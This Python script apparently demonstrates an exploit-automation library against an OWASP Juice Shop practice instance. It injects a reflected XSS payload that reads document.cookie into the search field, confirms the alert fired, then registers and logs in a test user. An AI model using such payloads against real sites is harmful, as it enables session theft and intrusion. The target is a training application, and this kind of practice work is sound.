import sys

from selenium_oxide import ExploitBuilder, SeO2User

exploit = ExploitBuilder("https://juice-shop.herokuapp.com")

dismiss_button_xpath = "/html/body/div[3]/div[2]/div/mat-dialog-container/app-welcome-banner/div/div[2]/button[2]"

search_xpath = '//*[@id="mat-input-0"]'

search_xss_payload = (
    '<img src="http://url.to.file.which/not.exist" onerror=alert(document.cookie);>'
)

user = SeO2User(password="Password1!")

(
    exploit.get("/")
    .click(dismiss_button_xpath, timeout=10)
    .click('//*[@id="searchQuery"]')
    .type_entry(
        search_xpath,
        search_xss_payload,
    )
    .send_enter(search_xpath)
)

if not exploit.wait_for_alert():
    print("[-] Alert not fired.")
    sys.exit(1)

(
    exploit.get("/#/register")
    .type_entry('//*[@id="emailControl"]', user.email)
    .type_entry('//*[@id="passwordControl"]', user.password)
    .type_entry('//*[@id="repeatPasswordControl"]', user.password)
    .click(
        "/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-register/div/mat-card/div[2]/div[1]/mat-form-field[1]/div/div[1]/div[3]/mat-select/div/div[2]"
    )
    .click("/html/body/div[3]/div[2]/div/div/div/mat-option[1]/span")
    .type_entry('//*[@id="securityAnswerControl"]', user.name)
    .click('//*[@id="registerButton"]')
    .login(
        "/#/login",
        user.email,
        user.password,
        '//*[@id="email"]',
        '//*[@id="password"]',
        '//*[@id="loginButton"]',
    )
)

print("[*] Exploit complete.")
